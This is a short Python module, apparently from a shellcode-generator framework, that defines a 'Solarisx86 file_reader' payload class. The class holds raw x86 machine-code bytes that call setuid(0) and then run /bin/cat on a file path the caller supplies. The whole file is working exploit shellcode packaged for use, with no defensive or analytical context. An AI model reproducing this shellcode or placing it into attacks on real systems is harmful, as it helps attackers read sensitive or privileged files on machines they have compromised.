from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "sm4x"
    Shellcode.info["name"] = "Solarisx86 - file_reader shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-111.php"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 47 + Shellcode().getsize(kwargs["file"])
        Shellcode.info["payload"] = [
            r"\x31\xc0\x50\x50\xb0\x17\xcd\x91\xeb\x20"
            r"\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62"
            r"\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50"
            r"\x52\x53\xb0\x3b\x50\xcd\x91\x40\x50\x50"
            r"\xcd\x91\xe8\xdb\xff\xff\xff"
            + kwargs["file"]
        ]
